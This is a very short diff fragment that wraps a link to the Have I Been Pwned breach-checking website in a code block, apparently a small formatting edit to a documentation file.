-
+```
 https://haveibeenpwned.com
+```
